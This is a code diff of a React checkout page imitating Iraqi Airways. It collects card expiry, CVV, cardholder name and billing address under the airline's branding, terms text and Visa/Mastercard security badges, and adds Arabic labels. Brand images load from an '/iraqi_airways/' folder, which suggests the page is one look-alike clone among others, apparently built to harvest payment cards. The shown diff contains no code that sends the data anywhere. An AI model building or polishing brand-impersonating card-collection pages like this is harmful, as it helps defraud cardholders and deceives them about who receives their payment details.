-                      style={{lineHeight:'52px'}}
-                    />
-                    <span className="text-gray-400 mx-2">|</span>
-                    <input id="expiry-year" type="text" inputMode="numeric" placeholder="Year" value={expiryYear} 
-                      onChange={(e) => { 
-                        const v = e.target.value.replace(/\D/g,'').slice(0,2); 
-                        setExpiryYear(v); 
-                        if (expiryMonth.length === 2 && v.length === 2) { 
-                          setValue('expiryDate', expiryMonth + '/' + v); 
-                          const m = parseInt(expiryMonth); 
-                          const y = parseInt(v); 
-                          const now = new Date(); 
-                          const cm = now.getMonth()+1; 
-                          const cy = now.getFullYear()%100; 
-                          const maxY = cy + 10; 
-                          if (m < 1 || m > 12) setExpiryError('Invalid month'); 
-                          else if (y < cy || (y === cy && m < cm)) setExpiryError('Card expired'); 
-                          else if (y > maxY) setExpiryError('Invalid year'); 
-                          else setExpiryError(''); 
-                        } else { 
-                          setValue('expiryDate', expiryMonth + '/' + v); 
-                          setExpiryError(''); 
-                        } 
-                      }} 
-                      maxLength={2} 
-                      className="w-[45%] bg-transparent text-gray-700 focus:outline-none text-[15px] h-full" 
-                      style={{lineHeight:'52px'}}
-                    />
+                      className="w-10 bg-transparent text-gray-700 focus:outline-none text-[15px] text-center" />
+                    <span className="text-gray-400 mx-1">/</span>
+                    <input id="expiry-year" type="text" inputMode="numeric" placeholder="YY" value={expiryYear} 
+                      onChange={(e) => setExpiryYear(e.target.value.replace(/\D/g,'').slice(0,2))} 
+                      className="w-10 bg-transparent text-gray-700 focus:outline-none text-[15px] text-center" />
                   </div>
                 </fieldset>
-                <fieldset className={`border rounded px-3 bg-[#f5faf0] border-[#4CAF50] flex-1 min-w-0 flex items-center flex-shrink-0`} style={{height:'52px', minHeight:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                  <legend className="text-[#2E7D32] text-xs px-1">Security Code*</legend>
+
+                <fieldset className={`border rounded px-3 bg-[#f5faf0] flex-1 min-w-0 flex items-center flex-shrink-0 ${errors.cvv ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', minHeight:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
+                  <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'رمز الأمان (CVV)*' : 'CVV*'}</legend>
                   <div className="flex items-center w-full">
-                    <input type="text" inputMode="numeric" placeholder="Enter CVV" {...register("cvv")} maxLength={3} onChange={(e) => { const v = e.target.value.replace(/\D/g,''); setValue('cvv', v); }} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px] h-full" style={{lineHeight:'52px'}} />
-                    <div className="cc-cvv-info w-5 h-5 bg-[#2E7D32] rounded-full flex items-center justify-center cursor-pointer relative group" title="The 3 digits can be found on the back of the card"><span className="text-white text-xs font-bold">i</span><div className="hidden group-hover:block absolute bottom-7 right-0 bg-gray-700 text-white text-xs rounded px-3 py-2 w-48 z-10">The 3 digits can be found on the back of the card</div></div>
+                    <input type="text" inputMode="numeric" placeholder="123" {...register("cvv")} maxLength={3} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px]" dir="ltr" />
+                    <svg className="w-6 h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                   </div>
                 </fieldset>
               </div>
-              {expiryError && <p className="text-red-500 text-xs">{expiryError}</p>}
 
-              {/* Cardholder name */}
-              <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] w-full mt-3 flex items-center flex-shrink-0" style={{height:'52px', minHeight:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                <legend className="text-[#2E7D32] text-xs px-1">Cardholder's full name*</legend>
-                <input type="text" placeholder="Cardholder's name" {...register("nameOnCard")} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z\s\-']/g,''); setValue('nameOnCard', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px] h-full" style={{lineHeight:'52px'}} />
+              {/* Name on card */}
+              <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center mt-3 ${errors.nameOnCard ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
+                <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الاسم على البطاقة*' : 'Name on card*'}</legend>
+                <input type="text" placeholder={isAr ? 'الاسم كما هو مكتوب على البطاقة' : 'Name as it appears on the card'} {...register("nameOnCard")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
               </fieldset>
 
-              {/* Billing Address */}
-              <div>
-              <h3 className="text-center text-[#2E7D32] font-bold mt-8 mb-4">Billing Address</h3>
-              <div className="space-y-4">
-                <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                  <legend className="text-[#2E7D32] text-xs px-1">Number and street name*</legend>
-                  <input type="text" placeholder="Enter a number and street name" onChange={(e) => { e.target.value = e.target.value.replace(/[^a-zA-Z0-9\s,.\/\-#]/g,''); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
-                </fieldset>
-                <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                  <legend className="text-[#2E7D32] text-xs px-1">Apartment, building, floor, etc.</legend>
-                  <input type="text" placeholder="Enter an apartment, building, floor, etc." onChange={(e) => { e.target.value = e.target.value.replace(/[^a-zA-Z0-9\s,.\/\-#]/g,''); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
-                </fieldset>
-                <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                  <legend className="text-[#2E7D32] text-xs px-1">Postcode / Zip*</legend>
-                  <input type="text" placeholder="Enter a postcode / zip" onChange={(e) => { e.target.value = e.target.value.replace(/[^a-zA-Z0-9\s\-]/g,''); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
-                </fieldset>
-                <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                  <legend className="text-[#2E7D32] text-xs px-1">City*</legend>
-                  <input type="text" placeholder="Enter a city" onChange={(e) => { e.target.value = e.target.value.replace(/[^a-zA-Z\s\-']/g,''); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
-                </fieldset>
-                <fieldset ref={countryRef} className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] relative flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                  <legend className="text-[#2E7D32] text-xs px-1">Country*</legend>
-                  {(() => {
-                    const countries = [
-                      {code:'iq',en:'Iraq',ar:'العراق'},{code:'af',en:'Afghanistan',ar:'أفغانستان'},{code:'al',en:'Albania',ar:'ألبانيا'},{code:'dz',en:'Algeria',ar:'الجزائر'},{code:'ar',en:'Argentina',ar:'الأرجنتين'},{code:'au',en:'Australia',ar:'أستراليا'},{code:'at',en:'Austria',ar:'النمسا'},{code:'bh',en:'Bahrain',ar:'البحرين'},{code:'bd',en:'Bangladesh',ar:'بنغلاديش'},{code:'be',en:'Belgium',ar:'بلجيكا'},{code:'br',en:'Brazil',ar:'البرازيل'},{code:'ca',en:'Canada',ar:'كندا'},{code:'cn',en:'China',ar:'الصين'},{code:'co',en:'Colombia',ar:'كولومبيا'},{code:'hr',en:'Croatia',ar:'كرواتيا'},{code:'cz',en:'Czech Republic',ar:'التشيك'},{code:'dk',en:'Denmark',ar:'الدنمارك'},{code:'eg',en:'Egypt',ar:'مصر'},{code:'fi',en:'Finland',ar:'فنلندا'},{code:'fr',en:'France',ar:'فرنسا'},{code:'de',en:'Germany',ar:'ألمانيا'},{code:'gr',en:'Greece',ar:'اليونان'},{code:'hu',en:'Hungary',ar:'المجر'},{code:'in',en:'India',ar:'الهند'},{code:'id',en:'Indonesia',ar:'إندونيسيا'},{code:'ir',en:'Iran',ar:'إيران'},{code:'ie',en:'Ireland',ar:'أيرلندا'},{code:'it',en:'Italy',ar:'إيطاليا'},{code:'jp',en:'Japan',ar:'اليابان'},{code:'jo',en:'Jordan',ar:'الأردن'},{code:'kw',en:'Kuwait',ar:'الكويت'},{code:'lb',en:'Lebanon',ar:'لبنان'},{code:'ly',en:'Libya',ar:'ليبيا'},{code:'my',en:'Malaysia',ar:'ماليزيا'},{code:'mx',en:'Mexico',ar:'المكسيك'},{code:'ma',en:'Morocco',ar:'المغرب'},{code:'nl',en:'Netherlands',ar:'هولندا'},{code:'nz',en:'New Zealand',ar:'نيوزيلندا'},{code:'ng',en:'Nigeria',ar:'نيجيريا'},{code:'no',en:'Norway',ar:'النرويج'},{code:'om',en:'Oman',ar:'عمان'},{code:'pk',en:'Pakistan',ar:'باكستان'},{code:'ps',en:'Palestine',ar:'فلسطين'},{code:'ph',en:'Philippines',ar:'الفلبين'},{code:'pl',en:'Poland',ar:'بولندا'},{code:'pt',en:'Portugal',ar:'البرتغال'},{code:'qa',en:'Qatar',ar:'قطر'},{code:'ro',en:'Romania',ar:'رومانيا'},{code:'ru',en:'Russia',ar:'روسيا'},{code:'sa',en:'Saudi Arabia',ar:'السعودية'},{code:'sg',en:'Singapore',ar:'سنغافورة'},{code:'za',en:'South Africa',ar:'جنوب أفريقيا'},{code:'kr',en:'South Korea',ar:'كوريا'},{code:'es',en:'Spain',ar:'إسبانيا'},{code:'sd',en:'Sudan',ar:'السودان'},{code:'se',en:'Sweden',ar:'السويد'},{code:'ch',en:'Switzerland',ar:'سويسرا'},{code:'sy',en:'Syria',ar:'سوريا'},{code:'th',en:'Thailand',ar:'تايلاند'},{code:'tn',en:'Tunisia',ar:'تونس'},{code:'tr',en:'Turkey',ar:'تركيا'},{code:'ua',en:'Ukraine',ar:'أوكرانيا'},{code:'ae',en:'UAE',ar:'الإمارات'},{code:'gb',en:'United Kingdom',ar:'بريطانيا'},{code:'us',en:'United States',ar:'أمريكا'},{code:'vn',en:'Vietnam',ar:'فيتنام'},{code:'ye',en:'Yemen',ar:'اليمن'}
-                    ];
-                    const filtered = countries.filter(c => c.en.toLowerCase().includes(countrySearch.toLowerCase()) || c.ar.includes(countrySearch));
-                    return <>
-                      <div className="flex items-center cursor-pointer w-full" onClick={() => setCountryOpen(!countryOpen)}>
-                        <img src={`https://flagcdn.com/20x15/${selectedCountry.code}.png`} alt="" className="mr-2 w-5 h-4" />
-                        <span className="text-gray-700 text-[15px]">{selectedCountry.en} - {selectedCountry.ar}</span>
-                        <span className="text-gray-400 ml-auto">▼</span>
-                      </div>
-                      {countryOpen && <div className="absolute left-0 right-0 top-full mt-1 bg-white border border-[#4CAF50] rounded shadow-lg z-50 max-h-60 overflow-y-auto">
-                        <div className="sticky top-0 bg-white p-2 border-b">
-                          <input type="text" placeholder="Search..." value={countrySearch} onChange={(e) => setCountrySearch(e.target.value)} className="w-full border border-gray-300 rounded px-2 py-1 text-sm focus:outline-none focus:border-[#4CAF50]" autoFocus />
-                        </div>
-                        {filtered.map(c => <div key={c.code} className="flex items-center px-3 py-2 hover:bg-[#e8f5e9] cursor-pointer" onClick={() => { setSelectedCountry(c); setCountryOpen(false); setCountrySearch(''); }}>
-                          <img src={`https://flagcdn.com/20x15/${c.code}.png`} alt="" className="mr-2 w-5 h-4" />
-                          <span className="text-sm text-gray-700">{c.en} - {c.ar}</span>
-                        </div>)}
-                      </div>}
-                    </>;
-                  })()}
-                </fieldset>
-              </div>
-              </div>
-              {/* Terms checkbox */}
-              <div className="mt-6 flex items-start gap-3">
-                <input type="checkbox" required className="mt-0.5 w-5 h-5 min-w-[20px] rounded border-2 border-[#4CAF50] appearance-none checked:bg-[#4CAF50] checked:border-[#4CAF50] relative cursor-pointer" style={{ backgroundImage: 'none' }} onChange={(e) => { if(e.target.checked) { e.target.style.backgroundImage = `url("data:image/svg+xml,%3Csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M12.207 4.793a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0l-2-2a1 1 0 011.414-1.414L6.5 9.086l4.293-4.293a1 1 0 011.414 0z'/%3E%3C/svg%3E")`; } else { e.target.style.backgroundImage = 'none'; } }} />
-                <span className="text-[#2E7D32] text-sm">I understand and accept the terms and conditions of carriage, the terms and conditions of seat selection, the privacy policy and the fare rules of Iraqi Airways.*</span>
-              </div>
-
               {/* Pay button */}
-              <div className="mt-6">
-                <button type="submit" disabled={!isFormValid} className={`px-10 py-3 rounded-full text-lg font-medium text-white ${isFormValid ? 'bg-[#1B5E20] hover:bg-[#0D3B0F]' : 'bg-gray-400 cursor-not-allowed'}`}>
-                  Pay IQD {displayAmountStr}
-                </button>
-              </div>
-
-              {/* Secured transaction bar - only show when card type selected */}
-              {selectedCardType && <div className="mt-6 flex items-center justify-between bg-[#e8f5e9] rounded px-4 py-2">
-                <div className="flex items-center gap-2">
-                  <svg className="w-4 h-4 text-[#4CAF50]" fill="currentColor" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-                  <span className="text-[#2E7D32] text-sm">Secured transaction</span>
-                </div>
-                <div className="text-right">
-                  {selectedCardType === 'Visa' && <div className="leading-tight"><span className="text-[#1a1f71] text-xs">Verified by</span><br/><span className="text-[#1a1f71] text-base font-bold">VISA</span></div>}
-                  {selectedCardType === 'MasterCard' && <div className="leading-tight"><span className="text-[#eb001b] text-xs">Mastercard</span><br/><span className="text-[#f79e1b] text-xs font-bold">SecureCode</span></div>}
-                </div>
-              </div>}
+              <button
+                type="submit"
+                disabled={!isFormValid}
+                className={`w-full mt-6 py-4 rounded-full text-lg font-bold transition-all ${
+                  isFormValid ? "bg-[#1B5E20] text-white hover:bg-[#0D3B0F] shadow-lg" : "bg-gray-300 text-gray-500 cursor-not-allowed"
+                }`}
+              >
+                {isAr ? `دفع IQD ${displayAmountStr}` : `Pay IQD ${displayAmountStr}`}
+              </button>
               </div>
             </form>
           </div>
         </div>
-
-        {/* Back button */}
-        <div className="flex justify-end mb-12">
-          <button onClick={() => navigate('/seat-customization')} className="bg-[#4ca42c] text-white px-8 py-3 rounded-full text-base font-medium hover:bg-[#3d8a24]">Back</button>
-        </div>
       </main>
 
       {/* Footer */}
-      <footer className="bg-[#4ca42c] text-white py-8">
-        <div className="max-w-6xl mx-auto px-4">
-          <div className="grid grid-cols-3 gap-8 mb-8">
-            <div><h4 className="font-bold mb-3">Plan and booking</h4><a href="#" className="text-sm hover:underline block">Book trip ↗</a></div>
-            <div><h4 className="font-bold mb-3">Contact us</h4><a href="#" className="text-sm hover:underline block mb-1">Contact us ↗</a><a href="#" className="text-sm hover:underline block">Iraqi airways offers ↗</a></div>
-            <div><h4 className="font-bold mb-3">About us</h4><a href="#" className="text-sm hover:underline block">Our fleet ↗</a></div>
-          </div>
-          <div className="text-center mb-6">
-            <h4 className="font-bold text-lg mb-3">Secured payment</h4>
-            <div className="flex justify-center gap-2 mb-2">
-              <img src="/iraqi_airways/americanexpress.png" alt="Amex" className="h-8 bg-white rounded p-1" />
-              <img src="/iraqi_airways/visa.png" alt="Visa" className="h-8 bg-white rounded p-1" />
-              <img src="/iraqi_airways/mastercard.png" alt="MC" className="h-8 bg-white rounded p-1" />
-              <img src="/iraqi_airways/paypal.png" alt="PayPal" className="h-8 bg-white rounded p-1" />
-              <img src="/iraqi_airways/dinersclub.png" alt="DC" className="h-8 bg-white rounded p-1" />
+      <footer className="bg-[#4ca42c] text-white mt-auto">
+        <div className="max-w-7xl mx-auto px-4 py-8">
+          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
+            <div className={isAr ? 'text-right' : 'text-left'}>
+              <h4 className="font-bold mb-4">{isAr ? 'الخطوط الجوية العراقية' : 'Iraqi Airways'}</h4>
+              <ul className="text-sm space-y-2">
+                <li><a href="#" className="hover:underline">{isAr ? 'من نحن' : 'About us'}</a></li>
+                <li><a href="#" className="hover:underline">{isAr ? 'اتصل بنا' : 'Contact us'}</a></li>
+                <li><a href="#" className="hover:underline">{isAr ? 'الأسطول' : 'Fleet'}</a></li>
+              </ul>
             </div>
-            <p className="text-xs opacity-80">Credit card fees may occur.</p>
-          </div>
-          <div className="text-center mb-4">
-            <h4 className="font-bold mb-3">Follow us</h4>
-            <div className="flex justify-center gap-4">
-              <a href="#" className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
-              <a href="#" className="w-8 h-8 bg-pink-500 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" strokeWidth="2"/><circle cx="12" cy="12" r="5" fill="none" stroke="white" strokeWidth="2"/></svg></a>
-              <a href="#" className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0C.488 3.45.029 5.804 0 12c.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0C23.512 20.55 23.971 18.196 24 12c-.029-6.185-.484-8.549-4.385-8.816zM9 16V8l8 4-8 4z"/></svg></a>
-              <a href="#" className="w-8 h-8 bg-blue-400 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/></svg></a>
+            <div className={isAr ? 'text-right' : 'text-left'}>
+              <h4 className="font-bold mb-4">{isAr ? 'التخطيط والحجز' : 'Plan & Book'}</h4>
+              <ul className="text-sm space-y-2">
+                <li><a href="#" className="hover:underline">{isAr ? 'احجز رحلة' : 'Book a flight'}</a></li>
+                <li><a href="#" className="hover:underline">{isAr ? 'حالة الرحلة' : 'Flight status'}</a></li>
+                <li><a href="#" className="hover:underline">{isAr ? 'الوجهات' : 'Destinations'}</a></li>
+              </ul>
+            </div>
+            <div className={isAr ? 'text-right' : 'text-left'}>
+              <h4 className="font-bold mb-4">{isAr ? 'قانوني' : 'Legal'}</h4>
+              <ul className="text-sm space-y-2">
+                <li><a href="#" className="hover:underline">{isAr ? 'سياسة الخصوصية' : 'Privacy Policy'}</a></li>
+                <li><a href="#" className="hover:underline">{isAr ? 'الشروط والأحكام' : 'Terms & Conditions'}</a></li>
+                <li><a href="#" className="hover:underline">{isAr ? 'مسؤولية الناقل' : 'Carrier\'s liability'}</a></li>
+              </ul>
+            </div>
+            <div className={isAr ? 'text-right' : 'text-left'}>
+              <h4 className="font-bold mb-4">{isAr ? 'تابعنا' : 'Follow us'}</h4>
+              <div className="flex gap-4">
+                <span className="cursor-pointer hover:opacity-80">FB</span>
+                <span className="cursor-pointer hover:opacity-80">TW</span>
+                <span className="cursor-pointer hover:opacity-80">IG</span>
+              </div>
             </div>
           </div>
-          <div className="text-center"><a href="#" className="text-sm underline">Technical details</a></div>
+          <div className="mt-8 pt-8 border-t border-white/20 text-center text-xs">
+            <p dir="ltr">&copy; 2026 {isAr ? 'الخطوط الجوية العراقية. جميع الحقوق محفوظة.' : 'Iraqi Airways. All rights reserved.'}</p>
+          </div>
         </div>
       </footer>
     </div>
